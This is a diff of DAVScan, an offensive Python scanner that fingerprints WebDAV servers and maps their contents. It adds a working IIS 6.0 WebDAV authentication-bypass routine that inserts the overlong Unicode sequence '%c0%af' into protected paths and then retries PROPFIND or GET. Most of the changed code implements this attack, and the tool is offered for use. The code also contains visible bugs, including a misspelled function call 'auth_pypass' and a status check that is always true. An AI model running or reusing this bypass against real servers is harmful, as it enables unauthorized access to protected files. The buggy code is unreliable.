@@ -1,6 +1,6 @@
 #!/usr/bin/python
 ########################################################################################################################################
-# DAVScan v0.5 (Codename: Cobra Whiskey.)
+# DAVScan v1.0 (Operation: Upgrayedd)
 #
 # Written by: Graph-X (@graphx)
 #	e-mail: graphx@sigaint.org
@@ -43,7 +43,7 @@
 ## ...Or just take my word for it and wing it. #YOLO
 ##
 #############################################################################################################################################
-
+import types
 import base64
 import sqlite3
 import requests
@@ -51,7 +51,7 @@ import argparse
 import sys
 import os.path
 from urlparse import urlparse
-
+from bs4 import BeautifulSoup
 # below imports are a part of davscan
 import fingerprinter
 import dav
@@ -89,7 +89,6 @@ class bcolors:
 def main():
 	sess = requests.Session() #see that? It's a capital S.  Punctuation bitches!
         args = get_args()
-	
         #assign variables
 	url = args.url
 	auth = args.auth
@@ -98,7 +97,12 @@ def main():
 	outfile = args.outfile
 	dos = args.dos
 	msf = args.msf
+        proxy = args.proxy
+        if proxy is not None:
+            proxies = ({urlparse(args.proxy).scheme: args.proxy})
+            sess.proxies = proxies
 	unichar = "%c0%af"
+        depth = args.depth
 
 	# disable cert verification automatically because that just breaks shit.
         sess.verify = False
@@ -108,22 +112,20 @@ def main():
 	#cut the url up like a hooker that stole some blow. You know what I'm talking about, Mikey. 
         purl = urlparse(url)
         host = purl.netloc
-        sess.headers = {'Host': purl.netloc}
-
+        sess.headers = {'Host': purl.netloc, 'User-Agent': 'Mozilla/5.0 Windows NT 10.0; WOW64; rv:5.0) Gecko/20100101 Firefox/50.0' }
         #if outfile exists we append otherwise write
 	if os.path.exists(outfile):
 		o = open(outfile, "a")
 	else:
 		o = open(outfile, "w+")
-	#set the auth header if needed
+        #set the auth header if needed
 	if auth is not None:
 		authstring = "%s:%s" % (user, pswd)
 		encodedstring = base64.b64encode(authstring)
 		sess.headers.update({'Authorization': 'Basic %s' % encodedstring})
-	else:
-		#just clearing out unused args
-		user = None
-		pswd = None
+	        #just clearing out unused args
+	        user = None
+	        pswd = None
 	
 	f = fingerprinter.fingerprint(sess,purl,msf,dos) 
 	server = f.get('Server', "No Server Header")
@@ -143,8 +145,9 @@ def main():
 	## db_setup(conn)
         
 	with o as i:
+            
 		## conn = sqlite3.connect(outfile + '.db')
-	##if db_setup(conn):
+	    ##if db_setup(conn):
 		i.write(bcolors.HEADER + "[*]==================={Server Fingerprint}===================[*] \n" + bcolors.ENDC)
 		i.write(bcolors.HEADER + "[*] Server: " + server  + "\n" + bcolors.ENDC)
 		i.write(bcolors.HEADER + "[*] WebDAV: " + davEnabled + "\n" + bcolors.ENDC)
@@ -157,58 +160,87 @@ def main():
 			    i.write(bcolors.OKGREEN + "[+]" + bcolors.ENDC + " %s ==> %s \n" % (k, v)  )
 		i.write(bcolors.HEADER + "[*]===================={~Server Mapping~}====================[*] \n" + bcolors.ENDC)
 		if davEnabled == "Enabled":
-			sess.headers.update({'Depth': 'infinity', 'Content-Type': 'application/xml', 'Translate': 'f'})
-                        client = dav.Client()
-                        r = client.propfind(sess,url)
-                        if r != 403:
-			    for file in r:
-			    	if file[1] == 0 and file[2].split(' ')[2] == "OK":
-				    fname = file[0].split('/')[-2]
-				    directory = directory + "/" + fname
-				    fname = directory
-				else:
-				    fname = file[0].split('/')[-1]
-				status = file[2].split(' ')[2]
-				size = str(file[1])
-				if status == "OK":
-					i.write(bcolors.OKGREEN + "[+] " + fname + "  " + status + "  " + size + "\n" + bcolors.ENDC)
-				else:
-				
-					i.write(bcolors.WARNING + "[-] " + fname + "  " + bcolors.FAIL + status + bcolors.WARNING + "  " + size + "\n" + bcolors.ENDC)
-                                        if dabp == True:
-					    f = file[0].split('/')[3:]
-					    d = len(f) -1
-					    if d != 0:
-						    url = prot + "://" + host + "/" + f[0][:2] + "%c0%af" + f[0][2:]
-						    n = 1
-						    while n != d:
-							    url = url + "/" + f[n]
-							    n = n + 1
-						    url = url + "/" + fname
-					    print("[!!] " + url)
-					    response = client.get(sess,url)
-					    if response.status_code == 200:
-					        i.write(bcolors.OKGREEN + "[+] " + fname + "  OK  DAV Auth Bypass Worked!! \n" + bcolors.ENDC)
-					    else:
-					        i.write(bcolors.FAIL + "[!] Webserver does not appear vulnerable to DAV auth bypass \n" + bcolors.ENDC)
-                                        else:
-                                            i.write(bcolors.WARNING + "[-] Webserver doesn't appear to be IIS 6.0. Skipping auth bypass attempt. \n" + bcolors.ENDC)
-                        else:
-                            i.write(bcolors.FAIL + "[!] Unable to access WebDAV, server is restricting access\n" + bcolors.ENDC)
-					
-						
-		else:
-			i.write(bcolors.FAIL +  "[-] WebDAV is not enabled.  Unable to map server. \n" + bcolors.ENDC)
-		i.close()
+                    sess.headers.update({'Depth': depth, 'Content-Type': 'application/xml'})
+                    client = dav.Client()
+
+                    print("[*] First PROPFIND request may take a couple of minutes if the Depth header is infinity and a lot of data is returned.")
+                    r = client.propfind(sess,url)
+		    for link in r[1].find_all('response'):
+                        if link.status is not None:
+                            stat = link.status.text.split(' ')[2].strip()
+			    if stat == 'OK':
+				i.write(bcolors.OKGREEN + "[+] " + urlparse(link.href.text).path + " " + link.status.text + "\n" + bcolors.ENDC)
+                            elif  link.status.text == "HTTP/1.1 401 Unauthorized" or link.status.text == "HTTP/1.1 502 Bad Gateway":
+                                i.write(bcolors.WARNING + "[-] " + link.href.text + " " + link.status.text + "\n" + bcolors.ENDC)
+                                i.write(bcolors.WARNING + "[-] Unauthorized status returned, attempting auth bypass...\n" + bcolors.ENDC)
+                                print(bcolors.WARNING + "[-] Unauthorized status returned, attempting auth bypass..." + bcolors.ENDC)
+                                url = urlparse(link.href.text)
+                                sess.headers.update({'Depth': '1'})
+                                path = url.path
+                                if path[-1:] == '/' and path[:1] == '/' and path.count('/') == 2:
+                                    p = path[1:][:-1]
+                                    q = ''
+                                elif path.count('/') > 2:
+                                    q = path[1:][:-1].split('/')
+                                    p = q[0]
+                                d = len(q)
+                                if d !=0:
+                                    u = url.scheme + "://" + url.netloc  + "/" + p[:2] + "%c0%af" + p[2:]
+                                    if isinstance(q,list):
+                                        n = 1
+                                        while n != d:
+                                            u = u + "/" + q[n]
+                                            n = n + 1
+                                        #print("[*] DEBUG: " + u)
+                                        #attempt propfind if url is a folder
+                                    if link.href.text[-1:] == "/":
+                                        resp = auth_bypass(sess,u,'propfind',i,client)
+                                    else:
+                                        resp = auth_pypass(sess,u,'get',i,client)
+                                    if not resp:
+                                        print(bcolors.FAIL + "[!] The server may be patched." + bcolors.ENDC)
+                                else:
+                                    i.write(bcolors.WARNING + "[-] Unknown response status: %s " % str(stat) + "for: " + link.href.text + "\n" + bcolors.ENDC)
+                else:
+                    print(bcolors.FAIL + "[!] WebDAV is not enabled" + bcolors.ENDC)
+        i.close()
+
+
 def banner():
 	print(bcolors.HEADER + "\n \
 	[*]===========================================================[*]\n \
-	[*]	 		  Davscan v0.5 (cobra whiskey)	      [*]\n \
+        [*]	 	    DAVscan v1.0 (Operation: Upgrayedd)       [*]\n \
 	[*]	 	       Written by Graph-X	   	      [*]\n \
 	[*]	 	  e-mail: graphx@sigaint.org 		      [*]\n \
 	[*]  	   	       twitter: @graphx  		      [*]\n \
 	[*]===========================================================[*]\n \
 	" + bcolors.ENDC)
+
+def auth_bypass(s,u,m,i,c):
+    c = dav.Client()
+    if m == 'propfind':
+        u = u + '/'
+        try:
+            r = c.propfind(s,u)
+        except Exception as e:
+            print("[!!] this error was returned: %s" % str(e))
+            return False
+    if m == 'get':
+        r = c.get(s,u)
+    if m == "propfind" and (r[0] == 200 or r[0] == 207):
+        i.write(bcolors.OKGREEN + "[+] Auth bypass successful using propfind method on %s\n" % str(u) + bcolors.ENDC)
+        for l in r[1].find_all('response'):
+            i.write(bcolors.OKGREEN + "[+] %s %s\n"% (urlparse(l.href.text).path, l.status.text) + bcolors.ENDC)
+        return True
+    elif m == "propfind" and ( r[0] != 200 or r[0] != 207):
+        i.write(bcolors.WARNING + "[-] Auth bypass failed using PROPFIND method on %s status code returned was: %s\n " % (str(u),str(r[0])) + bcolors.ENDC)
+        return False
+    elif m == "get" and r.status_code == 200:
+        i.write(bcolors.OKGREEN + "[+] Auth bypass worked using GET method on %s  HTTP/1.1 200 OK\n" % str(u) + bcolors.ENDC)
+        return True
+    else:
+        i.write(bcolors.WARNING + "[-] Auth bypass failed using GET method on %s status code returned was: %s\n"% (str(u),str(r.status_code))+ bcolors.ENDC)
+    return False
 ################################################################
 # get_args function:
 #	Uses the arg parser to collect command line arguments
@@ -220,16 +252,19 @@ def banner():
 def get_args():
 	parser = argparse.ArgumentParser()
         parser.add_argument('url', type=str, action='store', help="url of the server to scan; https://foo.com:8443/")
+        parser.add_argument('-D', '--depth', dest='depth', default='infinity', help="How many folders deep should davscan go (default is infinity); -d 5")
 	parser.add_argument('-a', '--auth', dest='auth', default=None, help="Basic authentication required; -a basic", required=False)
 	parser.add_argument('-u', '--user', dest='user', default=None, help="user; -u derpina", required=False)
-	parser.add_argument('-P', '--password', dest='password', default=None, help="password; -P 'P@$$W0rd'", required=False)
+	parser.add_argument('-p', '--password', dest='password', default=None, help="password; -P 'P@$$W0rd'", required=False)
 	parser.add_argument('-o', '--out', dest='outfile', default='/tmp/davout', help="output file.  defaults to; -o /tmp/davout", required=False)
+        parser.add_argument('-P', '--proxy', dest='proxy', default=None, help="proxy server if needed.; -P http://user:pass@1.2.3.4:8080/", required=False)
 	parser.add_argument('-d', '--no-dos', dest='dos', action='store_true', help="exclude DoS modules", required=False)
 	parser.add_argument('-m', '--no-msf', dest='msf', action='store_true', help="exclude MSF modules from results", required=False)
 	args = parser.parse_args()
+        
         #yeah I know this sloppy but what do you want for nothing?  A rubber biscuit?! ..bow bow bow
         if len(args.url) < 10:
-            print(bcolors.WARNING + "[!] Invalid or missing URL" + bcolors.ENDC)
+            print(bcolors.FAIL + "[!] Invalid or missing URL" + bcolors.ENDC)
             parser.print_help()
             sys.exit(2)
 	if len(sys.argv) == 1:
